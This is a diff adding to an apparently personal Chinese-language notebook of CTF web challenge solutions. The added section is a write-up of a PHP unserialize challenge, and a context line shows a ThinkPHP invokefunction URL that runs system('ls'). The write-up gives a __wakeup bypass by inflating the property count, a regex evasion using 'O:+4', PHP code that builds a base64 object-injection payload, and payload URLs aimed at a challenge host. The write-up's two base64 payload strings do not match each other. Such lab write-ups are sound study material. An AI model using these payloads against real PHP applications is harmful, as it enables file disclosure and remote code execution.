@@ -228,3 +228,118 @@ String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
      - `http://220.249.52.133:54736/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
      - 对app实例化，然后执行后面的shellcode
 
+# web_php_unserialize
+- 基本的几个要点：
+ 1. __wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。
+ 2. 如果可以不执行__wakeup()方法，转而执行__destruct()方法，那么就可以通过修改file的值，从而展现flag的内容
+ 3. 绕过__wakeup()的方法是：将序列化的变量个数改变就好了，<font color=#FF0033>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行</font>。
+ 4. 绕过正则表达式的方法：
+     - 本题的正则表达式：/[oc]:\d+:/i
+     - 意义为：匹配o或c，:,和1个以上的数字，比如：O:4
+     - 要绕过的话，在4前面加个+就好：O:+4
+- 掌握了几个基本的绕过要点之后，接下来看怎么进行注入
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) { 
+    $var = base64_decode($_GET['var']); 
+    if (preg_match('/[oc]:\d+:/i', $var)) { 
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var); 
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
+?>
+```
+- 这段php代码，先是定义了一个`Demo`类，Demo的函数很容易理解，__wakeup()为魔术函数，用来保证file不会被改变的
+- 在下面的代码段中，可以看到，先对`var`进行一个base64解码，然后进入正则匹配，如果匹配到，则die(终止)；如果没有，则反序列化var，那么这步反序列化就是注入的关键了
+- 整道题的思路就很清晰了：
+ 1. 对Demo进行序列化
+ 2. 对序列化后的Demo稍加改进，使之可以绕过正则
+ 3. 对序列化后的Demo进行base64转码
+ 4. 对var进行赋值（因为var是_GET方法，所以这里直接?就可以了）
+- 进行第一步的时候，我犯了错误，原来我自己写的字符串是：
+```
+O:4:"Demo":1:{s:8:"fl4g.php"}
+```
+- O:4:"Demo"表示，对象，Demo，4个字；:1:表示Demo有一个变量；s:8:"fl4g.php"表示，字符串：fl4g.php，8个字
+- 但是实际上序列化后的字符串为：
+ - "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
+ - 就恩多一个`s:10:"Demofile"`出来？？？？？
+ - 这里应该是类方法私有属性的一个特别之处，Demofile=>fl4g.php
+ - 比如这里修改一下Demo，得到`O:4:"Test":1:{s:10:"Testfile";s:8:"fl4g.php";}`
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public $foo='bar';
+    private $Foo='Bar';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+$var=new Demo('fl4g.php');
+$var=serialize($var);
+?>
+```
+ - 得到：`O:4:"Demo":3:{s:10:"Demofile";s:8:"fl4g.php";s:3:"foo";s:3:"bar";s:9:"DemoFoo";s:3:"Bar";}`
+ - 可以看到，public和private是有区别的，private开头都会加那串东西
+- 修改一下：`O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}`
+- base64转码：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
+- 最后payload：`http://220.249.52.133:54562/?var=%20TzorNDoiRGVtbyI6Mjp7czo4OiJmbDRnLnBocCI7fQ==`
+- 因为散装方法会出问题，比如忽略空格什么的，所以建议直接在php里面做
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+$var=new Demo('fl4g.php');
+$var=serialize($var);
+$var=str_replace('O:4:','O:+4:',$var);
+$var=str_replace(':1:',':2:',$var);
+var_dump(base64_encode($var));
+?>
+```
+- 也记录一下几个php函数的用法：
+ 1. serialize和unserialize
+ 2. 创建对象的方法：`new classname(value)`
+ 3. str_replace('被替换字符串','需要替换的字符串','整个字符串')，返回被修改的字符串
+ 4. strchr('str1','str2')用于匹配str1中是否有str2
+- 最后payload一下得到答案
